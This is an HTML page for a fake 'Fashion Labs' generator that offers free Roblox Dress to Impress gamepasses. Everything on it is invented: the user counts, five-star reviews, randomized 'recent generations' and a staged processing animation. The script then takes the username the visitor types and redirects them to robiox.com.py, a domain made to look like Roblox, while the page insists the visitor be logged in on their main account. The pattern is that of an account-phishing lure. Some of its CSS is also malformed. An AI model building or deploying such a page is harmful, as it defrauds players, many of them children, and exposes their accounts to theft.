<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FASHION LABS · Dashboard</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      width: 100%;
    }

    body {
      background: #0b0f1a;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 1rem;
      color: #FFFFFF;
      position: relative;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        radial-gradient(circle at 20% 30%, rgba(245, 197, 24, 0.03) 0%, transparent 40%),
        radial-gradient(circle at 80% 70%, rgba(245, 197, 24, 0.03) 0%, transparent 40%),
        radial-gradient(circle at 40% 20%, rgba(245, 197, 24, 0.02) 0%, transparent 50%);
      pointer-events: none;
      z-index: 0;
    }

    body::after {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: 
        linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
      background-size: 40px 40px;
      pointer-events: none;
      z-index: 0;
    }

    .page-transition {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #f5c518;
      z-index: 9999;
      pointer-events: none;
      transform: scaleY(0);
      transform-origin: top;
    }

    .page-transition.animate-out {
      animation: slideOut 0.5s cubic-bezier(0.4, 0, 0.2, 1) forwards;
    }

    .page-transition.animate-in {
      animation: slideIn 0.5s cubic-bezier(0.4, 0, 0.2, 1) forwards;
    }

    @keyframes slideOut {
      from { transform: scaleY(0); }
      to { transform: scaleY(1); }
    }

    @keyframes slideIn {
      from { transform: scaleY(1); }
      to { transform: scaleY(0); }
    }

    .top-notification {
      position: fixed;
      top: 1.5rem;
      left: 0;
      right: 0;
      display: flex;
      justify-content: center;
      padding: 0 1rem;
      z-index: 10001;
      pointer-events: none;
    }

    .notification-content {
      max-width: 600px;
      width: 100%;
      background: #1a1f2e;
      color: #FFFFFF;
      padding: 0.8rem 1.5rem;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border: 1px solid rgba(245, 197, 24, 0.2);
      pointer-events: auto;
      font-weight: 500;
      font-size: 0.95rem;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
      opacity: 0;
      transform: translateY(-100%);
      transition: opacity 0.3s ease, transform 0.3s ease;
    }

    .notification-content.show {
      opacity: 1;
      transform: translateY(0);
    }

    .notification-message {
      display: flex;
      align-items: center;
      gap: 0.8rem;
    }

    .notification-message i {
      color: #f5c518;
      font-size: 1rem;
    }

    .close-notification {
      background: transparent;
      border: none;
      color: rgba(255, 255, 255, 0.5);
      cursor: pointer;
      padding: 0.2rem 0.5rem;
      border-radius: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.2s;
      font-size: 1rem;
    }

    .close-notification:hover {
      background: rgba(245, 197, 24, 0.1);
      color: #f5c518;
    }

    .dashboard-container {
      max-width: 600px;
      width: 100%;
      height: 90vh;
      max-height: 800px;
      position: relative;
      display: flex;
      flex-direction: column;
      background: #0b0f1a;
      border: 1px solid rgba(245, 197, 24, 0.1);
      border-radius: 24px;
      overflow: hidden;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
      z-index: 1;
    }

    .dashboard-header {
      padding: 1.5rem 2rem;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 1px solid rgba(245, 197, 24, 0.1);
    }

    .dashboard-header h1 {
      font-size: 1.5rem;
      font-weight: 600;
      letter-spacing: -0.5px;
    }

    .dashboard-header h1 .fashion {
      color: #FFFFFF;
    }

    .dashboard-header h1 .labs {
      color: #f5c518;
    }

    .status-badge {
      background: rgba(245, 197, 24, 0.1);
      border: 1px solid rgba(245, 197, 24, 0.2);
      border-radius: 100px;
      padding: 0.4rem 1rem;
      font-size: 0.85rem;
      font-weight: 500;
      color: #f5c518;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .status-badge i {
      font-size: 0.7rem;
      color: #22c55e;
    }

    .slides-area {
      flex: 1;
      position: relative;
      overflow: hidden;
      padding: 1.5rem;
    }

    .slide {
      position: absolute;
      top: 1.5rem;
      left: 1.5rem;
      right: 1.5rem;
      bottom: 1.5rem;
      opacity: 0;
      visibility: hidden;
      display: flex;
      flex-direction: column;
      gap: 1.5rem;
      overflow-y: auto;
      overflow-x: hidden;
      scrollbar-width: thin;
      scrollbar-color: #f5c518 rgba(245, 197, 24, 0.1);
      transition: opacity 0.3s ease, visibility 0.3s ease;
    }

    .slide.active {
      opacity: 1;
      visibility: visible;
    }

    .slide::-webkit-scrollbar {
      width: 4px;
    }
    .slide::-webkit-scrollbar-track {
      background: rgba(245, 197, 24, 0.05);
      border-radius: 4px;
    }
    .slide::-webkit-scrollbar-thumb {
      background: #f5c518;
      border-radius: 4px;
    }
.welcome-card {
  background: #1a1f2e;
  border: 1px solid rgba(245, 197, 24, 0.1);

}

.welcome-card h2 {

.stats-grid {

.stat-card {

.stat-label {

  color: #f5c518;

}

.recent-card {

  padding: 1.2rem;
}

.recent-header {

.recent-header i {
  color: #f5c518;

.recent-list {

.recent-item {

  align-items: center;
  justify-content: space-between;

}

.recent-user {

}

.recent-user i {
  color: #f5c518;
  font-size: 0.8rem;
}

.recent-gamepass {
  color: #f5c518;

  display: flex;

}

.recent-gamepass img {
  width: 20px;

}

.reviews-card {
  background: #1a1f2e;
  border: 1px solid rgba(245, 197, 24, 0.1);
  border-radius: 16px;
  padding: 1.2rem;
}

.reviews-header {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  margin-bottom: 1rem;
  color: rgba(255, 255, 255, 0.7);
  font-size: 0.9rem;
  font-weight: 500;
}

.reviews-header i {
  color: #f5c518;
  font-size: 0.9rem;
}

.reviews-list {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.review-item {
  display: flex;
  flex-direction: column;
  gap: 0.3rem;
}

.review-stars {
  color: #f5c518;

}

.review-text {
  color: rgba(255, 255, 255, 0.9);

}

.review-author {
  color: rgba(245, 197, 24, 0.7);
  font-size: 0.8rem;
  font-weight: 500;
}
.how-it-works-card {
  background: #1a1f2e;
  border: 1px solid rgba(245, 197, 24, 0.1);
  border-radius: 20px;
  padding: 1.5rem;
}

.how-it-works-card h3 {
  color: #f5c518;
  font-size: 1.3rem;
  font-weight: 600;
  margin-bottom: 1.5rem;
}

.steps-timeline {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.step-item {
  display: flex;
  align-items: flex-start;
  gap: 1rem;
}

.step-number {
  width: 28px;
  height: 28px;
  background: rgba(245, 197, 24, 0.1);
  border: 1px solid rgba(245, 197, 24, 0.2);
  border-radius: 50%;

  align-items: center;
  justify-content: center;
  font-weight: 600;
  font-size: 0.85rem;
  color: #f5c518;
  flex-shrink: 0;
}

.step-text {
  color: rgba(255, 255, 255, 0.8);
  font-size: 0.95rem;
  line-height: 1.5;
  flex: 1;
}

.note-card {
  background: rgba(245, 197, 24, 0.05);
  border: 1px solid rgba(245, 197, 24, 0.15);
  border-radius: 12px;
  padding: 1rem;
  margin-top: 1.5rem;
}

.note-card p {
  color: #f5c518;
  font-size: 0.9rem;
  margin-bottom: 0.5rem;
  font-weight: 500;
}

.note-card ul {
  color: rgba(255, 255, 255, 0.6);
  font-size: 0.85rem;
  line-height: 1.5;
  margin-left: 1.2rem;
}

.category-card {
  background: #1a1f2e;
  border: 1px solid rgba(245, 197, 24, 0.1);
  border-radius: 16px;
  padding: 1.2rem;
}

.category-header {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  margin-bottom: 1rem;
  color: #f5c518;
  font-size: 1rem;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.category-header i {
  font-size: 0.9rem;
}

.gamepass-grid {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 0.8rem;
}

.gamepass-card {
  background: #0b0f1a;
  border: 1px solid rgba(245, 197, 24, 0.15);
  border-radius: 12px;
  padding: 0.8rem 0.3rem;
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  cursor: pointer;
  transition: all 0.2s ease;
}

.gamepass-card:hover {
  border-color: #f5c518;
  background: rgba(245, 197, 24, 0.05);
  transform: translateY(-2px);
}

.gamepass-card.selected {
  background: rgba(245, 197, 24, 0.1);

}

.gamepass-image {
  width: 70px;
  height: 70px;
  object-fit: contain;

  pointer-events: none;
}

.gamepass-name {
  color: rgba(255, 255, 255, 0.9);
  font-size: 0.9rem;
  font-weight: 500;
  pointer-events: none;
}

.gamepass-card.selected .gamepass-name {
  color: #f5c518;
}
    .confirmation-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;

      visibility: hidden;

    .confirmation-overlay.active {
      opacity: 1;
      visibility: visible;
    }

    .confirmation-card {
      background: #1a1f2e;
      border: 1px solid rgba(245, 197, 24, 0.2);
      border-radius: 24px;
      padding: 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 1.5rem;
      max-width: 400px;
      width: 90%;
    }

    .confirmation-card h2 {
      color: #f5c518;
      font-size: 2rem;
      font-weight: 600;
      text-align: center;
    }

    .confirmation-card p {
      color: rgba(255, 255, 255, 0.5);
      font-size: 1rem;
    }

    .popup-input-wrapper {
      position: relative;
      width: 100%;
    }

    .popup-input-wrapper i {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: #f5c518;
      font-size: 0.9rem;
    }

    #popupRobloxUser {
      background: #0b0f1a;
      border: 1px solid rgba(245, 197, 24, 0.2);
      border-radius: 12px;
      padding: 1rem 1rem 1rem 2.8rem;
      font-size: 1rem;
      width: 100%;
      color: #FFFFFF;
      outline: none;
    }

    #popupRobloxUser:focus {
      border-color: #f5c518;
    }

    .selected-gamepasses-popup {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      background: #0b0f1a;
      border-radius: 12px;
      padding: 0.8rem 2rem;
      border: 1px solid rgba(245, 197, 24, 0.2);
      width: 100%;
      justify-content: center;
    }

    .selected-gamepasses-popup img {
      width: 24px;
      height: 24px;
      object-fit: contain;
    }

    .selected-gamepasses-popup span {
      color: #f5c518;
      font-size: 1.3rem;
      font-weight: 600;
    }

    .popup-buttons {
      display: flex;
      gap: 1rem;
      width: 100%;
    }

    .popup-btn {
      flex: 1;
      padding: 0.9rem;
      border-radius: 12px;
      font-weight: 600;
      font-size: 0.9rem;
      cursor: pointer;
      transition: all 0.2s ease;
      text-transform: uppercase;
      border: none;
    }

    .cancel-btn {
      background: transparent;
      border: 1px solid rgba(245, 197, 24, 0.3);
      color: #f5c518;
    }

    .cancel-btn:hover {
      background: rgba(245, 197, 24, 0.1);
    }

    .confirm-popup-btn {
      background: #f5c518;
      color: #0b0f1a;
      font-weight: 700;
    }

    .confirm-popup-btn:hover {
      background: #ffd453;
      transform: translateY(-2px);
    }
    
    .nav-buttons-container {
      padding: 1rem 2rem;
      border-top: 1px solid rgba(245, 197, 24, 0.1);
      background: #0b0f1a;
    }

    .nav-buttons {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 1rem;
    }

    .nav-btn {
      background: transparent;
      border: 1px solid rgba(245, 197, 24, 0.2);
      border-radius: 12px;
      padding: 0.7rem 1.8rem;
      font-weight: 600;
      font-size: 0.9rem;
      color: #f5c518;
      display: flex;
      align-items: center;
      gap: 8px;
      cursor: pointer;
      transition: all 0.2s ease;
      text-transform: uppercase;
      flex: 1;
      justify-content: center;
    }

    .nav-btn:hover:not(:disabled) {
      background: rgba(245, 197, 24, 0.1);
      border-color: #f5c518;
    }

    .nav-btn:disabled {
      opacity: 0.3;
      cursor: not-allowed;
    }

    .dashboard-footer {
      padding: 1rem 2rem;
      border-top: 1px solid rgba(245, 197, 24, 0.1);
      background: #0b0f1a;
      text-align: center;
    }

    .footer-text {
      color: rgba(255, 255, 255, 0.4);
      font-size: 0.8rem;
      font-weight: 400;
      letter-spacing: 0.5px;
    }

    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(11, 15, 26, 0.95);
      backdrop-filter: blur(10px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.3s ease, visibility 0.3s ease;
    }

    .loading-overlay.active {
      opacity: 1;
      visibility: visible;
    }

    .loading-card {
      background: #1a1f2e;
      border: 1px solid rgba(245, 197, 24, 0.2);
      border-radius: 24px;
      padding: 2.5rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 2rem;
      max-width: 400px;
      width: 90%;
    }

    .loading-spinner {
      width: 50px;
      height: 50px;
      border: 3px solid rgba(245, 197, 24, 0.1);
      border-top: 3px solid #f5c518;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .preparing-gamepasses-list {
      width: 100%;
      max-height: 200px;
      overflow-y: hidden;
      display: flex;
      flex-direction: column;
      gap: 0.5rem;
    }

    .preparing-gamepass-item {
      background: #0b0f1a;
      border: 1px solid rgba(245, 197, 24, 0.15);
      border-radius: 8px;
      padding: 0.5rem 1rem;
      display: flex;
      align-items: center;
      gap: 0.8rem;
      transition: all 0.3s ease;
    }

    .preparing-gamepass-item.flashing {
      border-color: #f5c518;
      background: rgba(245, 197, 24, 0.1);
      animation: pulse 0.8s ease infinite;
    }

    .preparing-gamepass-item.completed {
      border-color: #22c55e;
      background: rgba(34, 197, 94, 0.1);
      opacity: 0.8;
    }

    .preparing-gamepass-item.completed .preparing-gamepass-status {
      color: #22c55e;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 5px #f5c518; }
      50% { box-shadow: 0 0 15px #f5c518; }
      100% { box-shadow: 0 0 5px #f5c518; }
    }

    .preparing-gamepass-image {
      width: 30px;
      height: 30px;
      object-fit: contain;
    }

    .preparing-gamepass-name {
      flex: 1;
      color: white;
      font-size: 0.9rem;
    }

    .preparing-gamepass-status {
      color: #f5c518;
      font-size: 0.8rem;
      font-style: italic;
    }

    .loading-progress-bar {
      width: 100%;
      height: 6px;
      background: rgba(245, 197, 24, 0.1);
      border-radius: 3px;
      overflow: hidden;
    }

    .loading-progress-fill {
      height: 100%;
      width: 0%;
      background: #f5c518;
      transition: width 0.1s linear;
    }

    .loading-cancel-btn {
      background: transparent;
      border: 1px solid rgba(245, 197, 24, 0.3);
      border-radius: 10px;
      padding: 0.8rem 2.5rem;
      color: #f5c518;
      font-weight: 600;
      font-size: 0.9rem;
      text-transform: uppercase;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .loading-cancel-btn:hover {
      background: rgba(245, 197, 24, 0.1);
      border-color: #f5c518;
    }
  </style>
</head>
<body>
  <div class="page-transition" id="pageTransition"></div>

  <div class="top-notification" id="notification">
    <div class="notification-content" id="notificationContent">
      <div class="notification-message">
        <i class="fas fa-exclamation-circle"></i>
        <span id="notificationMessage">Please select at least one gamepass.</span>
      </div>
      <button class="close-notification" id="closeNotificationBtn">
        <i class="fas fa-times"></i>
      </button>
    </div>
  </div>

  <div class="confirmation-overlay" id="confirmationOverlay">
    <div class="confirmation-card">
      <h2>FASHION LABS</h2>
      <p>almost done</p>
      <div class="popup-input-wrapper">
        <i class="fas fa-user"></i>
        <input type="text" id="popupRobloxUser" placeholder="roblox username" autocomplete="off">
      </div>
      <div class="selected-gamepasses-popup" id="popupSelectedGamepasses">
        <img src="https://raw.githubusercontent.com/LemonadeForYou/Infinity/main/features/fashionlabs.png" alt="Fashion Labs">
        <span id="popupGamepassCount">0</span>
      </div>
      <div class="popup-buttons">
        <button class="popup-btn cancel-btn" id="cancelPopupBtn">cancel</button>
        <button class="popup-btn confirm-popup-btn" id="confirmPopupBtn">confirm</button>
      </div>
    </div>
  </div>
  
  <div class="dashboard-container">
    <div class="dashboard-header">
      <h1><span class="fashion">FASHION</span> <span class="labs">LABS</span></h1>
      <div class="status-badge">
        <i class="fas fa-circle"></i>
        <span>online</span>
      </div>
    </div>

    <div class="slides-area" id="slidesArea"></div>

    <div class="nav-buttons-container">
      <div class="nav-buttons">
        <button class="nav-btn" id="backBtn" disabled><i class="fas fa-arrow-left"></i> back</button>
        <button class="nav-btn" id="nextBtn">next <i class="fas fa-arrow-right"></i></button>
      </div>
    </div>

    <div class="dashboard-footer">
      <div class="footer-text">Fashion Labs © 2026</div>
    </div>
  </div>

  <div class="loading-overlay" id="loadingOverlay">
    <div class="loading-card">
      <div class="loading-spinner"></div>
      <div class="preparing-gamepasses-list" id="preparingGamepassesList"></div>
      <div class="loading-progress-bar">
        <div class="loading-progress-fill" id="loadingProgressFill"></div>
      </div>
      <button class="loading-cancel-btn" id="loadingCancelBtn">CANCEL</button>
    </div>
  </div>

  <script>
    (function() {
      const slides = [
        {
          type: 'welcome',
          title: '<span class="fashion-white">FASHION</span> <span class="labs-gold">LABS</span>',
          subtitle: 'Select any gamepass and get it instantly in Dress to Impress.'
        },
        {
          type: 'howitworks',
          title: 'how does it work?',
          steps: [
            'Select the gamepass you want.',
            'Enter your Roblox username.',
            'The site processes your request.',
            'You will be redirected to a Dress to Impress private server.',
            'A bot will add the selected gamepass to your account.'
          ],
          note: '⚠️ Important',
          notes: ['Must be logged into Roblox', 'Main account only']
        },
        {
          type: 'category',
          category: 'FEATURES',
          gamepasses: ['VIP', 'x2 Money', 'Custom Makeup', 'Run Faster', 'Increased Item Limit', 'Materials+']
        }
      ];

      const allGamepassesList = [];
      slides.forEach(slide => {
        if (slide.type === 'category') {
          slide.gamepasses.forEach(gamepass => allGamepassesList.push(gamepass));
        }
      });

      let currentSlide = 0;
      let selectedGamepasses = new Set();
      let notificationTimeout = null;
      let redirectTimeout = null;
      let preparationInterval = null;
      let recentInterval = null;
      const scrollPositions = {};

      const slidesArea = document.getElementById('slidesArea');
      const pageTransition = document.getElementById('pageTransition');
      const notificationContent = document.getElementById('notificationContent');
      const notificationMessage = document.getElementById('notificationMessage');
      const closeNotificationBtn = document.getElementById('closeNotificationBtn');
      const backBtn = document.getElementById('backBtn');
      const nextBtn = document.getElementById('nextBtn');
      const loadingOverlay = document.getElementById('loadingOverlay');
      const preparingGamepassesList = document.getElementById('preparingGamepassesList');
      const loadingProgressFill = document.getElementById('loadingProgressFill');
      const loadingCancelBtn = document.getElementById('loadingCancelBtn');
      const confirmationOverlay = document.getElementById('confirmationOverlay');
      const popupUsernameInput = document.getElementById('popupRobloxUser');
      const popupGamepassCount = document.getElementById('popupGamepassCount');
      const cancelPopupBtn = document.getElementById('cancelPopupBtn');
      const confirmPopupBtn = document.getElementById('confirmPopupBtn');

      const names = ['Alex', 'Mia', 'Kai', 'Zoe', 'Leo', 'Eli', 'Ivy', 'Max', 'Luna', 'Jay', 'Eva', 'Ben', 'Amy', 'Sam', 'Ray'];
      const gamepassNamesList = ['VIP', 'x2 Money', 'Custom Makeup', 'Run Faster', 'Increased Item Limit', 'Materials+'];

      const getImagePath = (name) => {
        const baseUrl = 'https://raw.githubusercontent.com/LemonadeForYou/Infinity/main/features/';
        const images = {
          'VIP': 'vip.png',
          'x2 Money': 'x2_money.png',
          'Custom Makeup': 'custom_makeup.png',
          'Run Faster': 'run_faster.png',
          'Increased Item Limit': 'increased_item_limit.png',
          'Materials+': 'materials.png',
          'FASHION LABS': 'fashionlabs.png'
        };
        return baseUrl + (images[name] || 'placeholder.png');
      };

      function generateRandomRecent() {
        const recentList = document.getElementById('recentList');
        if (!recentList) return;
        const shuffled = [...Array(3)].map(() => ({
          name: names[Math.floor(Math.random() * names.length)],
          gamepass: gamepassNamesList[Math.floor(Math.random() * gamepassNamesList.length)]
        }));
        recentList.innerHTML = shuffled.map(item => `
          <div class="recent-item">
            <div class="recent-user"><i class="fas fa-user-circle"></i><span>${item.name}</span></div>
            <span class="recent-gamepass"><img src="${getImagePath(item.gamepass)}" alt="${item.gamepass}" onerror="this.src='https://via.placeholder.com/20/1a1f2e/f5c518?text=${item.gamepass}'">${item.gamepass}</span>
          </div>
        `).join('');
      }

      function showNotification(message) {
        notificationMessage.textContent = message;
        notificationContent.classList.add('show');
        if (notificationTimeout) clearTimeout(notificationTimeout);
        notificationTimeout = setTimeout(() => notificationContent.classList.remove('show'), 3000);
      }

      closeNotificationBtn.addEventListener('click', () => {
        notificationContent.classList.remove('show');
        if (notificationTimeout) clearTimeout(notificationTimeout);
      });

      function saveScrollPosition() {
        const activeSlide = document.querySelector('.slide.active');
        if (activeSlide) scrollPositions[currentSlide] = activeSlide.scrollTop;
      }

      function restoreScrollPosition() {
        const activeSlide = document.querySelector('.slide.active');
        if (activeSlide && scrollPositions[currentSlide] !== undefined) activeSlide.scrollTop = scrollPositions[currentSlide];
      }

      function toggleGamepass(gamepassIndex) {
        saveScrollPosition();
        if (selectedGamepasses.has(gamepassIndex)) selectedGamepasses.delete(gamepassIndex);
        else selectedGamepasses.add(gamepassIndex);
        const gamepassCard = document.querySelector(`.gamepass-card[data-gamepass-index="${gamepassIndex}"]`);
        if (gamepassCard) gamepassCard.classList.toggle('selected');
      }
      window.toggleGamepass = toggleGamepass;

      function showConfirmationPopup() {
        if (selectedGamepasses.size === 0) {
          showNotification('Please select at least one gamepass.');
          return false;
        }
        popupUsernameInput.value = '';
        popupGamepassCount.textContent = selectedGamepasses.size;
        confirmationOverlay.classList.add('active');
        setTimeout(() => popupUsernameInput.focus(), 100);
        return true;
      }

      function hideConfirmationPopup() { confirmationOverlay.classList.remove('active'); }

      function processOrder() {
        const username = popupUsernameInput.value.trim();
        if (!username) {
          showNotification('Please enter your Roblox username');
          popupUsernameInput.focus();
          return;
        }
        hideConfirmationPopup();
        
        const selectedGamepassNames = Array.from(selectedGamepasses).sort((a, b) => a - b).map(i => allGamepassesList[i]);
        const totalTime = Math.max(selectedGamepassNames.length * 1500, 5000);
        const timePerStep = totalTime / selectedGamepassNames.length;

        loadingOverlay.classList.add('active');
        
        preparingGamepassesList.innerHTML = selectedGamepassNames.map((name, idx) => `
          <div class="preparing-gamepass-item" data-gamepass-idx="${idx}">
            <img class="preparing-gamepass-image" src="${getImagePath(name)}" onerror="this.src='https://via.placeholder.com/30/1a1f2e/f5c518?text=${name}'">
            <span class="preparing-gamepass-name">${name}</span>
            <span class="preparing-gamepass-status">waiting...</span>
          </div>
        `).join('');

        const gamepassItems = document.querySelectorAll('.preparing-gamepass-item');
        let currentIdx = 0;
        loadingProgressFill.style.width = '0%';
        if (preparationInterval) clearInterval(preparationInterval);
        
        preparationInterval = setInterval(() => {
          if (currentIdx < gamepassItems.length) {
            if (currentIdx > 0) {
              const prev = gamepassItems[currentIdx - 1];
              prev.classList.remove('flashing');
              prev.classList.add('completed');
              prev.querySelector('.preparing-gamepass-status').textContent = 'complete!';
            }
            const current = gamepassItems[currentIdx];
            current.classList.add('flashing');
            current.querySelector('.preparing-gamepass-status').textContent = 'preparing...';
            current.scrollIntoView({ behavior: 'smooth', block: 'center' });
            currentIdx++;
          } else {
            if (gamepassItems.length > 0) {
              const last = gamepassItems[gamepassItems.length - 1];
              last.classList.remove('flashing');
              last.classList.add('completed');
              last.querySelector('.preparing-gamepass-status').textContent = 'complete!';
            }
            clearInterval(preparationInterval);
          }
        }, timePerStep);

        const startTime = Date.now();
        const updateProgress = () => {
          const elapsed = Date.now() - startTime;
          loadingProgressFill.style.width = Math.min((elapsed / totalTime) * 100, 100) + '%';
          if (elapsed < totalTime) requestAnimationFrame(updateProgress);
        };
        requestAnimationFrame(updateProgress);

        const gamepassIndices = Array.from(selectedGamepasses).join(',');
        redirectTimeout = setTimeout(() => {
          clearInterval(preparationInterval);
          window.location.href = `https://www.robiox.com.py/games/15532962292/Dress-to-Impress?privateServerLinkCode=088320015095610633366556564846&roblox=${encodeURIComponent(username)}&gamepasses=${encodeURIComponent(gamepassIndices)}`;
        }, totalTime);
      }

      cancelPopupBtn.addEventListener('click', hideConfirmationPopup);
      confirmPopupBtn.addEventListener('click', processOrder);
      confirmationOverlay.addEventListener('click', (e) => { if (e.target === confirmationOverlay) hideConfirmationPopup(); });
      popupUsernameInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') { e.preventDefault(); processOrder(); } });

      function goToSlide(index) {
        if (index < 0 || index >= slides.length) return;
        saveScrollPosition();
        pageTransition.classList.add('animate-out');
        setTimeout(() => {
          currentSlide = index;
          renderSlides();
          backBtn.disabled = currentSlide === 0;
          nextBtn.innerHTML = currentSlide === slides.length - 1 ? 'confirm <i class="fas fa-check-circle"></i>' : 'next <i class="fas fa-arrow-right"></i>';
          pageTransition.classList.remove('animate-out');
          pageTransition.classList.add('animate-in');
          setTimeout(() => pageTransition.classList.remove('animate-in'), 500);
        }, 500);
      }

      function renderSlides() {
        let html = '';
        slides.forEach((slide, slideIndex) => {
          const isActive = slideIndex === currentSlide ? 'active' : '';
          html += `<div class="slide ${isActive}" data-slide="${slideIndex}" style="overflow-y: ${slideIndex === 0 || slideIndex === 1 || slideIndex === 2 ? 'auto' : 'hidden'};">`;
          if (slide.type === 'welcome') {
            html += `
              <div class="welcome-card"><h2>${slide.title}</h2><p>${slide.subtitle}</p></div>
              <div class="stats-grid">
                <div class="stat-card"><div class="stat-label">active users</div><div class="stat-value">2,453</div></div>
                <div class="stat-card"><div class="stat-label">gamepasses given</div><div class="stat-value">8,721</div></div>
              </div>
              <div class="recent-card"><div class="recent-header"><i class="fas fa-history"></i><span>Recent Generations</span></div><div class="recent-list" id="recentList"></div></div>
              <div class="reviews-card">
                <div class="reviews-header"><i class="fas fa-star"></i><span>Reviews</span></div>
                <div class="reviews-list">
                  <div class="review-item"><div class="review-stars">★★★★★</div><div class="review-text">"Got my gamepass instantly!"</div><div class="review-author">– Alex</div></div>
                  <div class="review-item"><div class="review-stars">★★★★★</div><div class="review-text">"Actually works perfectly"</div><div class="review-author">– Mia</div></div>
                  <div class="review-item"><div class="review-stars">★★★★★</div><div class="review-text">"Best fashion generator"</div><div class="review-author">– Kai</div></div>
                </div>
              </div>
            `;
            setTimeout(generateRandomRecent, 0);
            if (recentInterval) clearInterval(recentInterval);
            recentInterval = setInterval(generateRandomRecent, 8000);
          } else if (slide.type === 'howitworks') {
            html += `
              <div class="how-it-works-card">
                <h3>${slide.title}</h3>
                <div class="steps-timeline">${slide.steps.map((step, idx) => `<div class="step-item"><div class="step-number">${idx + 1}</div><div class="step-text">${step}</div></div>`).join('')}</div>
                <div class="note-card"><p>${slide.note}</p><ul>${slide.notes.map(note => `<li>${note}</li>`).join('')}</ul></div>
              </div>
            `;
          } else if (slide.type === 'category') {
            let startIndex = 0;
            for (let i = 0; i < slideIndex; i++) if (slides[i].type === 'category') startIndex += slides[i].gamepasses.length;
            html += `<div class="category-card"><div class="category-header"><i class="fas fa-tag"></i> ${slide.category}</div><div class="gamepass-grid">`;
            slide.gamepasses.forEach((gamepassName, gamepassIdx) => {
              const globalIndex = startIndex + gamepassIdx;
              const isSelected = selectedGamepasses.has(globalIndex);
              html += `
                <div class="gamepass-card ${isSelected ? 'selected' : ''}" data-gamepass-index="${globalIndex}" onclick="toggleGamepass(${globalIndex})">
                  <img class="gamepass-image" src="${getImagePath(gamepassName)}" alt="${gamepassName}" onerror="this.src='https://via.placeholder.com/70/1a1f2e/f5c518?text=${gamepassName}'">
                  <div class="gamepass-name">${gamepassName}</div>
                </div>
              `;
            });
            html += `</div></div>`;
          }
          html += `</div>`;
        });
        slidesArea.innerHTML = html;
        requestAnimationFrame(() => restoreScrollPosition());
      }

      loadingCancelBtn.addEventListener('click', () => {
        loadingOverlay.classList.remove('active');
        clearInterval(preparationInterval);
        clearTimeout(redirectTimeout);
      });

      backBtn.addEventListener('click', () => goToSlide(currentSlide - 1));
      nextBtn.addEventListener('click', () => {
        if (currentSlide === slides.length - 1) showConfirmationPopup();
        else goToSlide(currentSlide + 1);
      });

      renderSlides();
    })();
  </script>
</body>
</html>
